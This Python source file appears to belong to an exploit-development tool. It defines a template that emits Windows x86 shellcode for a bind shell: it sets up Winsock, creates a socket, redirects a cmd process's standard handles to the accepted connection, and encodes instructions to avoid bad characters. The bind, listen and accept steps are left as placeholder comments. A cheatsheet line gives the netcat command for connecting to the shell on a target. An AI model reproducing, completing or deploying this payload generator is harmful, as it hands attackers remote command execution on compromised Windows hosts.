"""Bind shell payload template scaffold.

Requires: WSAStartup, WSASocketA, LoadLibraryA, CreateProcessA
Variables: socket_handle, bind_socket
Strings: cmd (mov method)

NOTE: This is a scaffold. bind/listen/accept calls are placeholders.
"""
from __future__ import annotations

from .base import PayloadTemplate, TemplateConfig
from ..encode import (
    safe_push_word_as_dword, safe_dword_store,
    safe_lea, safe_mem_load, safe_mem_store,
    safe_call_mem,
)


class BindShellTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        bc = config.badchars
        wsa_start_off = -layout.slot("WSAStartup").offset
        wsa_sock_off  = -layout.slot("WSASocketA").offset
        cpa_off       = -layout.slot("CreateProcessA").offset
        sock_h_off    = -layout.slot("socket_handle").offset
        bind_s_off    = -layout.slot("bind_socket").offset
        wsadata_off   = -layout.slot("WSADATA").offset
        si_off        = -layout.slot("STARTUPINFOA").offset
        pi_off        = -layout.slot("PROCESS_INFORMATION").offset
        cmd_off       = -layout.slot("cmd").offset

        sock_h_ref = layout.slot("socket_handle").ebp_ref

        return "\n".join([
            "; -- Bind Shell Payload (scaffold) --",
            f"; Listen port: {config.lport}",
            "; NOTE: bind/listen/accept stubs are not generated - add manually.",
            "",
            "    ; WSAStartup(0x0202, &WSADATA)",
            *safe_lea("esi", "ebp", wsadata_off, bc),
            "    push esi",
            *safe_push_word_as_dword(0x0202, bc),
            *safe_call_mem("ebp", wsa_start_off, bc),
            "",
            "    ; WSASocketA - create bind socket",
            "    xor  eax, eax",
            "    push eax",
            "    push eax",
            "    push eax",
            "    mov  al, 0x6",
            "    push eax",
            "    sub  al, 0x5",
            "    push eax",
            "    inc  eax",
            "    push eax",
            *safe_call_mem("ebp", wsa_sock_off, bc),
            *safe_mem_store("ebp", bind_s_off, "eax", bc),
            "    ; save bind socket",
            "",
            "    ; TODO: bind(bind_socket, &sockaddr, 0x10)",
            "    ; TODO: listen(bind_socket, 0)",
            "    ; TODO: accept(bind_socket, NULL, NULL) -> socket_handle",
            f"    ; After accept: store client socket in {sock_h_ref}",
            "",
            "    ; Set STARTUPINFOA stdio handles to accepted client socket",
            *safe_mem_load("eax", "ebp", sock_h_off, bc),
            *safe_lea("edi", "ebp", si_off, bc),
            *safe_dword_store("edi", 0x38, "eax", bc, tmp="ecx"),
            *safe_dword_store("edi", 0x3c, "eax", bc, tmp="ecx"),
            *safe_dword_store("edi", 0x40, "eax", bc, tmp="ecx"),
            "",
            "    ; CreateProcessA",
            *safe_lea("esi", "ebp", cmd_off, bc),
            *safe_lea("edi", "ebp", si_off, bc),
            *safe_lea("ebx", "ebp", pi_off, bc),
            "    xor  eax, eax",
            "    push ebx",
            "    push edi",
            "    push eax",
            "    push eax",
            "    push eax",
            "    inc  eax",
            "    push eax",
            "    xor  eax, eax",
            "    push eax",
            "    push eax",
            "    push esi",
            "    push eax",
            *safe_call_mem("ebp", cpa_off, bc),
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Connect to bind shell", f"nc -nv <TARGET_IP> {config.lport}"),
        ]
